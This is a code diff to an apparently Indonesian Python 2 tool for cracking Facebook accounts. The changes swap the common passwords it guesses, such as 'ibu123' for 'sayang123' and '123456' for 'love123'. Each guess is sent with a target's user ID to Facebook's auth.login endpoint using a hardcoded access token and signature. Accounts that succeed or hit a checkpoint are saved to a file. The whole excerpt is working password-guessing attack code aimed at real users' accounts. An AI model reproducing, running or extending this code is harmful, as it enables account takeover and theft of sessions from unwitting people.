@@ -531,7 +531,7 @@ def pilih_indo():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = 'ibu123'
+															pass7 = 'sayang123'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															w = json.load(data)
 															if 'access_token' in w:
@@ -553,7 +553,7 @@ def pilih_indo():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																else:
-																	pass8 = 'facebook1234'
+																	pass8 = 'sayang1234'
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	w = json.load(data)
 																	if 'access_token' in w:
@@ -575,7 +575,7 @@ def pilih_indo():
 																			cek.close()
 																			cekpoint.append(user+pass8)
 																		else:
-																				pass9 = 'ibu1234'
+																				pass9 = 'sayang12345'
 																				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																				w = json.load(data)
 																				if 'access_token' in w:
@@ -597,7 +597,7 @@ def pilih_indo():
 																						cek.close()
 																						cekpoint.append(user+pass9)
 																					else:
-																						pass10 = 'ibu12345'
+																						pass10 = 'facebook1234'
 																						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																						w = json.load(data)
 																						if 'access_token' in w:
@@ -663,7 +663,7 @@ def pilih_indo():
 																												cek.close()
 																												cekpoint.append(user+pass12)
 																											else:
-																												pass13 = '123456'
+																												pass13 = 'love123'
 																												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																												w = json.load(data)
 																												if 'access_token' in w:
@@ -685,7 +685,7 @@ def pilih_indo():
 																														cek.close()
 																														cekpoint.append(user+pass13)
 																													else:
-																														pass14 = 'sayang123'
+																														pass14 = 'love1234'
 																														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																														w = json.load(data)
 																														if 'access_token' in w:
@@ -707,7 +707,7 @@ def pilih_indo():
 																																cek.close()
 																																cekpoint.append(user+pass14)
 																															else:
-																																pass15 = 'sayang12345'
+																																pass15 = 'love12345'
 																																data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																																w = json.load(data)
 																																if 'access_token' in w:
@@ -739,7 +739,7 @@ def pilih_indo():
 	print '\033[1;97m[\033[1;93m🍒\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'
 	print "\033[37;1m======================================================="
 	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
-	os.system("python2 Lolzsec.py")
+	os.system("python2 LulZsecx.py")
 	
 
 	
